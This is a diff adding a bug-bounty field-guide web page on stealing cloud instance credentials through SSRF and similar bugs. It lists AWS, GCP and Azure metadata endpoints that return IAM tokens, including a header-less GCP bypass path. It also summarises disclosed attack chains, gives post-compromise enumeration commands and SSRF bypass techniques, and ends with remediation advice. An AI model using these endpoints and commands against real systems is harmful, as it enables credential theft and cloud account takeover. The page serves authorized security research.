@@ -1,0 +1,121 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Cloud Metadata &amp; Keys · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Cloud Metadata &amp; Keys</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="on" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main"><header class="entry-head"><h1>Cloud Metadata &amp; Keys</h1></header><p>&gt; Cloud instances expose an internal metadata service that hands running code temporary credentials. &gt; Any bug that makes the <em>server</em> issue a request you control — SSRF, XXE, a rendering/parsing sink, &gt; or RCE — can reach it and walk away with IAM/service-account tokens, which is why medium SSRFs turn &gt; into full infrastructure compromise. This page is the cloud-pivot layer; the entry bugs live on &gt; <a href="../vulnerabilities/ssrf.html"> 0 </a>, <a href="../vulnerabilities/xxe.html"> 1 </a>, &gt; <a href="../vulnerabilities/command-injection.html"> 2 </a>, and &gt; <a href="#"> 3 </a>.</p>
+<h2 class="sec" id="metadata-endpoints"><span class="tick">§</span>Metadata endpoints</h2>
+<div class="pre" data-lang=""># AWS IMDSv1 (no header needed)
+http://169.254.169.254/latest/meta-data/iam/security-credentials/           # role name
+http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;ROLE&gt;     # AccessKeyId/SecretAccessKey/Token
+http://169.254.169.254/latest/user-data                                     # often has secrets/bootstrap
+# AWS IMDSv2 (session token; SSRF must be able to send PUT + header)
+PUT /latest/api/token  (Header: X-aws-ec2-metadata-token-ttl-seconds: 21600)
+GET /latest/meta-data/... (Header: X-aws-ec2-metadata-token: &lt;token&gt;)
+# GCP (normally needs Metadata-Flavor: Google — but v1beta1 does NOT)  #341876
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01   (Header: Metadata: true)</div>
+<h2 class="sec" id="real-chains-from-the-corpus"><span class="tick">§</span>Real chains from the corpus</h2>
+<ul><li><strong><code>#341876</code></strong> (SSRF, $25k): HTML-render SSRF → GCP token + <code>kube-env</code> → kubelet client cert →</li></ul>
+<p><code>kubectl exec</code> → <strong>root on all containers</strong>. Used <code>?alt=json</code>, <code>?recursive=true</code>, and the <code>/v1beta1</code> header-less path.</p>
+<ul><li><strong><code>#2262382</code></strong>: HTML injection → server-side <strong>PDF render</strong> SSRF → AWS IMDS → credentials.</li><li><strong><code>#422944</code></strong>: image upload → ImageMagick delegate → Ghostscript <code>%pipe%</code> RCE → AWS IMDS IAM creds.</li><li><strong><code>#716292</code></strong>: leaked key in public SCM → internal API → <strong>AWS account takeover</strong>.</li></ul>
+<h2 class="sec" id="after-you-have-credentials"><span class="tick">§</span>After you have credentials</h2>
+<div class="pre" data-lang=""># Verify identity &amp; scope, then enumerate what the role/token can do
+aws sts get-caller-identity
+aws s3 ls ; aws iam list-attached-role-policies --role-name &lt;ROLE&gt;
+# GCP: check token scope before assuming write access
+curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=&lt;TOKEN&gt;"</div>
+<p>Impact framing: show what the credential <em>reaches</em> (a private bucket, prod DB, another service), not just that you retrieved a token. Redact the secret in the report but prove you had it.</p>
+<h2 class="sec" id="bypasses-to-reach-169-254-169-254"><span class="tick">§</span>Bypasses to reach 169.254.169.254</h2>
+<p>See the SSRF <a href="../vulnerabilities/ssrf.html#bypasses">bypass matrix</a>: decimal/octal/hex IP encodings, <code>[::ffff:169.254.169.254]</code>, DNS rebinding, open-redirect on an allowlisted host, the GCP <code>/v1beta1</code> header bypass (<code>#341876</code>), and gopher/dict for non-HTTP internal services.</p>
+<h2 class="sec" id="remediation-to-recognize-non-exploitable-variants"><span class="tick">§</span>Remediation (to recognize non-exploitable variants)</h2>
+<ul><li>Enforce <strong>IMDSv2</strong> (session token + hop limit = 1) so SSRF can't trivially read creds.</li><li>Egress-filter link-local/private ranges; deploy a metadata-concealment proxy (<code>#341876</code> fix).</li><li>Least-privilege instance roles; short token TTLs; never bake keys into user-data or images.</li></ul>
+<h2 class="sec" id="references"><span class="tick">§</span>References</h2>
+<ul><li><a href="../vulnerabilities/ssrf.html"> 0 </a>, <a href="../chains.html"> 1  Pattern 2</a>,</li></ul>
+<p><a href="../vulnerabilities/info-disclosure.html"> 0 </a>, skill <code>hacktivity/24-ssrf-cloud-metadata</code>.</p>
+<ul><li><code>https://hackerone.com/reports/341876</code>, <code>/2262382</code>, <code>/422944</code>, <code>/716292</code>.</li></ul></main>
+  <nav class="toc"><h5>On this page</h5><a href="#metadata-endpoints">Metadata endpoints</a><a href="#real-chains-from-the-corpus">Real chains from the corpus</a><a href="#after-you-have-credentials">After you have credentials</a><a href="#bypasses-to-reach-169-254-169-254">Bypasses to reach 169.254.169.254</a><a href="#remediation-to-recognize-non-exploitable-variants">Remediation (to recognize non-exploitable variants)</a><a href="#references">References</a></nav></div><footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
